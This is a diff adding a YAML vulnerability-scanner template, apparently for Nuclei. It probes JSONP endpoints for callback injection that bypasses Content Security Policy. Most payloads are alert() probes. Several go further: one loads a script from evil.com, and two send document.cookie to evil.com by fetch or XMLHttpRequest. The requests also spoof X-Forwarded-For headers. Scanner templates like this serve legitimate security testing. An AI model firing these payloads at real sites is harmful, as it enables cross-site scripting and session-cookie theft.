@@ -1,0 +1,370 @@
+id: medium-webapp-csp-bypass-jsonp-callback
+
+info:
+  name: CSP Bypass via JSONP Callback - Elite Red Team
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced Content Security Policy bypass using JSONP callback manipulation.
+    Tests for CSP bypass via JSONP endpoints, callback parameter injection, and script-src bypass.
+    Includes multiple JSONP exploitation techniques and CSP evasion methods.
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/content-security-policy
+    - https://owasp.org/www-community/attacks/Content_Security_Policy
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+  tags: csp-bypass,jsonp,callback-injection,xss,red-team
+
+variables:
+  # Common JSONP callback parameters
+  callback_params:
+    - "callback"
+    - "jsonp"
+    - "cb"
+    - "jsonpcallback"
+    - "jsoncallback"
+    - "function"
+    - "method"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/data"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/jsonp"
+      - "{{BaseURL}}/api/jsonp"
+      - "{{BaseURL}}/search"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      Referer: https://evil.com
+
+    # Test basic JSONP callback injection
+    raw:
+      - |
+        GET {{path}}?callback=alert(document.domain) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "alert(document.domain)"
+          - "alert("
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/javascript"
+          - "text/javascript"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\('
+          - 'callback=([^&\s]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/data"
+
+    # Test JSONP with XSS payload
+    raw:
+      - |
+        GET {{path}}?callback=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "eval(String.fromCharCode"
+          - "String.fromCharCode"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "javascript"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsonp"
+      - "{{BaseURL}}/api/jsonp"
+
+    # Test JSONP with function constructor
+    raw:
+      - |
+        GET {{path}}?jsonp=Function('return alert(1)')() HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "Function('return alert(1)')()"
+          - "Function("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users"
+
+    # Test JSONP with setTimeout
+    raw:
+      - |
+        GET {{path}}?cb=setTimeout(alert,1000,'XSS') HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "setTimeout(alert,1000,'XSS')"
+          - "setTimeout("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search"
+
+    # Test JSONP with setInterval
+    raw:
+      - |
+        GET {{path}}?callback=setInterval(function(){alert('CSP Bypass')},5000) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "setInterval(function(){alert('CSP Bypass')},5000)"
+          - "setInterval("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/data"
+
+    # Test JSONP with document.write
+    raw:
+      - |
+        GET {{path}}?jsonpcallback=document.write('<script>alert("CSP Bypass")</script>') HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "document.write('<script>alert"
+          - "document.write("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search"
+
+    # Test JSONP with location.href
+    raw:
+      - |
+        GET {{path}}?jsoncallback=location.href='javascript:alert(document.domain)' HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "location.href='javascript:alert"
+          - "location.href="
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsonp"
+
+    # Test JSONP with window.open
+    raw:
+      - |
+        GET {{path}}?function=window.open('javascript:alert("CSP Bypass via JSONP")') HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "window.open('javascript:alert"
+          - "window.open("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users"
+
+    # Test JSONP with innerHTML
+    raw:
+      - |
+        GET {{path}}?method=document.body.innerHTML='<img src=x onerror=alert(1)>' HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "document.body.innerHTML='<img src=x onerror=alert(1)>'"
+          - "innerHTML="
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/data"
+
+    # Test JSONP with createElement
+    raw:
+      - |
+        GET {{path}}?callback=function(){var s=document.createElement('script');s.src='//evil.com/xss.js';document.head.appendChild(s)} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "document.createElement('script')"
+          - "createElement("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search"
+
+    # Test JSONP with fetch API
+    raw:
+      - |
+        GET {{path}}?cb=fetch('//evil.com/steal',{method:'POST',body:document.cookie}) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "fetch('//evil.com/steal'"
+          - "fetch("
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/jsonp"
+
+    # Test JSONP with XMLHttpRequest
+    raw:
+      - |
+        GET {{path}}?jsonp=function(){var x=new XMLHttpRequest();x.open('GET','//evil.com/'+document.cookie);x.send()} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "new XMLHttpRequest()"
+          - "XMLHttpRequest("
+        condition: or
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - 'Content-Security-Policy:\s*([^\r\n]+)'
+          - 'X-Content-Security-Policy:\s*([^\r\n]+)'
+
+      - type: regex
+        part: body
+        regex:
+          - '([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(\s*({.*?}|\[.*?\])\s*\)'
+          - 'callback=([^&\s\'"]+)'
